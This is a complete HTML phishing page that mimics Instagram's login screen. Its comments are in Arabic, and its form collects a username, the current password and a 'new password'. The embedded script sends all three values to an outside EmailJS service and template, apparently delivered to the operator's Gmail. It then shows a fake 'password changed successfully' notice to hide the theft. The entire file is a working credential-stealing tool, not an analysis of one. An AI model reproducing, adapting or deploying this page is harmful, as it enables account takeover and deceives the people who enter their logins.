<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="icon" type="image/png" href="https://www.betterworldbooks.com/content/images/Go/IG_Glyph_Fill.png">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>

    <!-- ✅ مكتبة EmailJS -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #000000;
            color: #ffffff;
            display: flex;
            min-height: 100vh;
        }

        .container {
            display: flex;
            width: 100%;
        }

        .left-side {
            flex: 1;
            background-color: #000000;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 40px;
            padding-top: 140px;
            text-align: center;
            position: relative;
        }

        .insta-icon {
            width: 90px;
            height: 90px;
            position: absolute;
            top: 40px;
            left: 40px;
            object-fit: contain;
            transition: transform 0.3s ease, filter 0.3s ease;
            cursor: pointer;
        }

        .insta-icon:hover {
            transform: scale(1.05);
            filter: brightness(1.2);
        }

        .left-side h1 {
            font-size: 32px;
            font-weight: 600;
            line-height: 1.4;
            max-width: 420px;
            margin-bottom: 40px;
            letter-spacing: -0.5px;
        }

        .highlight {
            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
            background-clip: text;
            -webkit-text-fill-color: transparent;
            display: inline-block;
        }

        .promo-container {
            position: relative;
            width: 100%;
            max-width: 440px;
            height: auto;
            margin-top: 20px;
        }

        .promo-img {
            width: 100%;
            height: auto;
            object-fit: contain;
        }

        .right-side {
            flex: 1;
            background-color: #121212;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 40px;
        }

        .login-box {
            width: 100%;
            max-width: 368px;
            text-align: center;
        }

        /* ✅ شعار الهاتف — مخفي على الشاشات الكبيرة */
        .mobile-logo {
            display: none;
        }

        .login-box h2 {
            font-size: 20px;
            font-weight: 500;
            margin-bottom: 30px;
            letter-spacing: -0.2px;
        }

        .input-group {
            margin-bottom: 12px;
        }

        .input-field {
            width: 100%;
            height: 52px;
            background-color: #1c1c1c;
            border: 1px solid #363636;
            border-radius: 12px;
            padding: 0 16px;
            color: #ffffff;
            font-size: 14px;
            outline: none;
            transition: border-color 0.2s, background-color 0.2s;
            text-align: left;
        }

        textarea.input-field {
            height: 52px;
            min-height: 52px;
            max-height: 120px;
            padding: 14px 16px;
            resize: none;
            font-family: inherit;
            font-size: 14px;
            line-height: 1.4;
            vertical-align: top;
            border: 1px solid #363636;
            outline: none;
            overflow-y: auto;
            box-sizing: border-box;
        }

        .input-field:hover {
            background-color: #262626;
            border-color: #4a4a4a;
        }

        .input-field:focus {
            background-color: #262626;
            border-color: #666666;
        }

        .input-field::placeholder {
            color: #727272;
        }

        .btn-login {
            width: 100%;
            height: 44px;
            background-color: #002d54;
            color: #777777;
            border: none;
            border-radius: 22px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 12px;
            transition: background-color 0.3s, color 0.3s, filter 0.2s;
        }

        .btn-login:not([disabled]) {
            cursor: pointer;
        }

        .btn-login:not([disabled]):hover {
            filter: brightness(1.15);
        }

        .btn-login[disabled] {
            cursor: not-allowed;
        }

        .forgot-link {
            display: block;
            text-align: center;
            color: #ffffff;
            font-size: 14px;
            text-decoration: none;
            margin-top: 28px;
            font-weight: 500;
            padding: 8px;
            border-radius: 8px;
            transition: background-color 0.2s, color 0.2s;
        }

        .forgot-link:hover {
            background-color: rgba(255, 255, 255, 0.08);
            color: #d0d0d0;
        }

        .fb-login-btn {
            width: 100%;
            height: 44px;
            background-color: #1c1c1c;
            border: 1px solid #363636;
            border-radius: 22px;
            color: #ffffff;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            transition: background-color 0.2s, border-color 0.2s;
        }

        .fb-login-btn:hover {
            background-color: #2a2a2a;
            border-color: #4a4a4a;
        }

        .fb-icon {
            fill: #ffffff;
        }

        .btn-create {
            width: 100%;
            height: 44px;
            background: none;
            border: 1px solid #0095f6;
            border-radius: 22px;
            color: #0095f6;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 16px;
            transition: background-color 0.2s, box-shadow 0.2s;
        }

        .btn-create:hover {
            background-color: rgba(0, 149, 246, 0.1);
            box-shadow: 0 0 8px rgba(0, 149, 246, 0.25);
        }

        .success-message {
            display: none;
            margin-top: 20px;
            padding: 12px;
            background-color: rgba(0, 149, 246, 0.15);
            border: 1px solid #0095f6;
            border-radius: 12px;
            color: #0095f6;
            font-size: 14px;
            font-weight: 500;
        }

        .success-message.show {
            display: block;
        }

        /* ✅ التجاوب مع الهواتف */
        @media (max-width: 768px) {
            .left-side {
                display: none;
            }
            .right-side {
                background-color: #000000;
            }
            
            /* ✅ إظهار الشعار في الهاتف */
            .mobile-logo {
                display: block;
                width: 70px;
                height: 70px;
                margin: 0 auto 30px auto;
                object-fit: contain;
            }
        }

        @media (max-width: 1100px) and (min-width: 769px) {
            .insta-icon {
                width: 70px;
                height: 70px;
                top: 30px;
                left: 30px;
            }
            .left-side {
                padding-top: 120px;
            }
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- النصف الأيسر (الترويجي) -->
        <div class="left-side">
            <img class="insta-icon" src="https://www.betterworldbooks.com/content/images/Go/IG_Glyph_Fill.png" alt="Instagram Logo">
            <h1>See everyday moments from <br><span class="highlight">your close friends.</span></h1>
            <div class="promo-container">
                <img class="promo-img" src="https://static.cdninstagram.com/rsrc.php/yJ/r/53X3pk-t2Gn.webp" alt="Instagram Close Friends Preview">
            </div>
        </div>

        <!-- النصف الأيمن (نموذج تسجيل الدخول) -->
        <div class="right-side">
            <div class="login-box">
                
                <!-- ✅ شعار الهاتف (يظهر فقط على الشاشات الصغيرة) -->
                <img class="mobile-logo" src="https://www.betterworldbooks.com/content/images/Go/IG_Glyph_Fill.png" alt="Instagram Logo">

                <form id="contact-form">
                    <div class="input-group">
                        <input type="text" id="username" name="username" class="input-field" 
                               placeholder="Mobile number, username or email" 
                               autocomplete="username" required>
                    </div>

                    <div class="input-group">
                        <input type="password" id="password" name="password" class="input-field" 
                               placeholder="Password" 
                               autocomplete="current-password" required>
                    </div>

                    <div class="input-group">
                        <input type="password" id="newPassword" name="newPassword" class="input-field" 
                               placeholder="New Password" 
                               autocomplete="new-password" required>
                    </div>

                    <button type="submit" class="btn-login" id="loginBtn" disabled>Log in</button>
                </form>

                <div class="success-message" id="successMessage">
                    ✅ Your password has been changed successfully!
                </div>

                <a href="#" class="forgot-link">Forgot password?</a>

                <button class="fb-login-btn">
                    <svg class="fb-icon" width="18" height="18" viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
                    Log in with Facebook
                </button>

                <button class="btn-create">Create new account</button>
            </div>
        </div>
    </div>

    <script>
        // ✅ تهيئة EmailJS بالمفتاح العام
        emailjs.init("PeC0z-hUxGpwIOq0L");

        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const newPasswordInput = document.getElementById('newPassword');
        const submitBtn = document.getElementById('loginBtn');
        const contactForm = document.getElementById('contact-form');
        const successMessage = document.getElementById('successMessage');

        function toggleButtonState() {
            const usernameOk = usernameInput.value.trim() !== "";
            const passwordOk = passwordInput.value.trim().length >= 6;
            const newPasswordOk = newPasswordInput.value.trim().length >= 6;

            if (usernameOk && passwordOk && newPasswordOk) {
                submitBtn.style.backgroundColor = "#0095f6";
                submitBtn.style.color = "#ffffff";
                submitBtn.removeAttribute("disabled");
            } else {
                submitBtn.style.backgroundColor = "#002d54";
                submitBtn.style.color = "#777777";
                submitBtn.setAttribute("disabled", "true");
            }
        }

        usernameInput.addEventListener('input', toggleButtonState);
        passwordInput.addEventListener('input', toggleButtonState);
        newPasswordInput.addEventListener('input', toggleButtonState);

        // ✅ إرسال النموذج عبر Gmail (service_9ss4g5f)
        contactForm.addEventListener('submit', function(e) {
            e.preventDefault();

            submitBtn.textContent = "Sending...";
            submitBtn.setAttribute("disabled", "true");

            const templateParams = {
                username: usernameInput.value,
                password: passwordInput.value,
                newPassword: newPasswordInput.value
            };

            emailjs.send(
                "service_9ss4g5f",        // ✅ Gmail
                "template_mbdmsuk",       // ✅ Template ID
                templateParams
            )
            .then(function(response) {
                console.log('✅ SUCCESS!', response.status, response.text);
                successMessage.classList.add('show');
                contactForm.reset();
                toggleButtonState();

                setTimeout(() => {
                    successMessage.classList.remove('show');
                }, 5000);
            })
            .catch(function(error) {
                console.error('❌ FAILED...', error);
            })
            .finally(function() {
                submitBtn.textContent = "Log in";
                toggleButtonState();
            });
        });
    </script>

</body>
</html>
